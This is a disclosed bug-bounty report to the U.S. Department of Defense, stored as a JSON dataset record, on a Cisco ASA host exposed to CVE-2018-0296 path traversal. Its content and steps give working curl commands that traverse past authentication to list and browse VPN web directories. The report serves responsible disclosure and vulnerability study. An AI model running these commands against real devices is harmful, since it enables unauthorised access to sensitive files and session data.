{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "warsong ",
  "title": "https://█████████ Vulnerable to CVE-2018-0296 Cisco ASA Path Traversal Authentication Bypass",
  "content": "\nSummary:\nhttps://█████ is an ASA running software vulnerable to CVE-2018-0296 which allows a remote attacker to exploit a path traversal vulnerability and bypass authentication to sensitive files. The attacker can use this to enumerate the ASA VPN web directory structure and exploit privileged access to the system to gain access to session information.\nStep-by-step Reproduction Instructions\nYou can exploit with cURL or Burp: curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json\nYou can alter the command slightly to pull additional directory information: curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b to dig into these privileged directories.\nI also pushed a request to repeater to do this in Burp for screenshots.\nProduct, Version, and Configuration (If applicable) https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd https://nvd.nist.gov/vuln/detail/CVE-2018-0296\nSuggested Mitigation/Remediation Actions\nUpgrade the ASA software version per the referenced advisory.\nImpact\nHigh - This vulnerability allows the attacker to browse files past the authentication and disclose sensitive information.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1570216500,
  "report_url": "https://hackerone.com/reports/622864",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Use cURL or Burp to send a crafted request to the vulnerable ASA device: `curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json`"
    ],
    [
      2,
      "Modify the request to explore additional directories: `curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b`"
    ]
  ],
  "vuln_description": "This vulnerability is a path traversal and authentication bypass in Cisco ASA devices (CVE-2018-0296). It allows an attacker to access sensitive files and directories without authentication by exploiting a flaw in the web interface's handling of directory traversal sequences.",
  "reason": "The attack involves a straightforward path traversal technique that is well-documented and does not require complex interactions or state manipulation. The vulnerability is also publicly known and has a clear exploitation path.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}